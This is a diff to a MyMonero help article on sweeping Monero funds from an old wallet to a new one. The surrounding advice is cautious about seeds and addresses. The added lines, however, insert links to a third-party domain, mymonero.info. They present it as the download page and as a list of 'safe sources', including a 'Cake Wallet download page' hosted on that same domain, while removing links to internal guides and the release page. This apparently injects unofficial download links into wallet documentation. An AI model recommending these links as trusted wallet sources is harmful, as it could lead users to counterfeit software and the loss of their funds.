@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 Sweeping means sending all funds from one wallet to a new wallet in an on-chain transaction. It is different from restoring the same seed in another app, and it requires a valid destination address, a fee, and careful verification before you confirm.
 
+
+Prefer reading on the web? The [MyMonero sweep to new wallet page](https://mymonero.info/mymonero-sweep-to-new-wallet) on mymonero.info explains the same problem, the [Cake Wallet download page](https://mymonero.info/github/cake-developments) lists the safe sources, and [the MyMonero FAQ](https://mymonero.info/faq) covers the common questions.
+
 ## You'll see this if
 - You want to move away from an old MyMonero wallet rather than restore it elsewhere.
 - You created a new wallet and want to send the old wallet’s funds there.
@@ -54,12 +57,12 @@ A sweep does not repair a seed, change a restore height, or confirm a pending tr
 ## If that did not work
 If a sweep option is unavailable, check that the wallet is fully synchronized and that funds are spendable rather than locked or pending. Do not infer that creating a new wallet transferred the old balance. Restoring the original seed and sending to a new wallet are separate tasks.
 
-If the balance appears lower than expected, consider whether some funds are not yet spendable and review the displayed fee before sending. For a missing balance or incomplete history, check [zero balance after restore](./mymonero-balance-shows-zero.md) and [restore height](./mymonero-restore-height-explained.md). Do not respond to a mismatch by providing the seed to a supposed recovery agent.
+If the balance appears lower than expected, consider whether some funds are not yet spendable and review the displayed fee before sending. For a missing balance or incomplete history, check [zero balance after restore](./mymonero-balance-shows-zero.md) and restore height. Do not respond to a mismatch by providing the seed to a supposed recovery agent.
 
-If the transaction does not appear, wait and use the wallet’s transaction status information. Error 523 is general guidance that a server connection is unavailable; it does not establish that a transaction failed or that your seed is wrong. MyMonero’s final desktop version, [v1.3.3](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3), remains unmaintained.
+If the transaction does not appear, wait and use the wallet’s transaction status information. Error 523 is general guidance that a server connection is unavailable; it does not establish that a transaction failed or that your seed is wrong. MyMonero’s final desktop version, v1.3.3, remains unmaintained.
 
 ## Prevention
-Keep the receiving wallet’s seed backed up before moving funds, and verify that the wallet opens as expected. Record the destination from the receiving app and check it on the device you control immediately before confirming. Understand how fees affect a send-all transaction and do not rush. For a migration, decide in advance whether you want to restore the same wallet or send to a separate wallet; use the [migration checklist](./mymonero-migration-checklist.md). Treat unsolicited offers to move funds as suspicious and never share recovery words.
+Keep the receiving wallet’s seed backed up before moving funds, and verify that the wallet opens as expected. Record the destination from the receiving app and check it on the device you control immediately before confirming. Understand how fees affect a send-all transaction and do not rush. For a migration, decide in advance whether you want to restore the same wallet or send to a separate wallet; use the migration checklist. Treat unsolicited offers to move funds as suspicious and never share recovery words.
 
 ## FAQ
 <details><summary>Does restoring my seed sweep the funds?</summary>
@@ -90,6 +93,7 @@ No. Never share your seed or private keys. Verify the destination address yourse
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/cake-developments)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
